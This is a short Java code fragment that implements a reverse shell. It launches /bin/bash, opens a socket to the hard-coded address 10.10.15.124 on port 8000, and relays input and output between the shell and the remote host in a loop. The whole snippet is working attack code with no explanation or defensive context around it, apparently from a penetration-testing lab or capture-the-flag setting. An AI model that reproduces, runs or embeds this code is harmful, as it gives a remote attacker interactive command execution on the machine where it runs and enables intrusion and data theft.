String cmd ="/bin/bash";
Process p = new ProcessBuilder(cmd).start();

String host = "10.10.15.124";
int port = 8000;
Socket s = new Socket(host,port);

InputStream pi = p.getInputStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so=s.getOutputStream();

while (!s.isClosed()) {

	try {
		
		if (si.available() > 0) {
		
			po.write(si.read());

		}

		if (pi.available() > 0) {
		
			so.write(pi.read()); 
		
		}

		so.flush();
		po.flush();
		Thread.sleep(50);

	} catch (IOException i) {

		break;

	}

}

p.destroy();
s.close();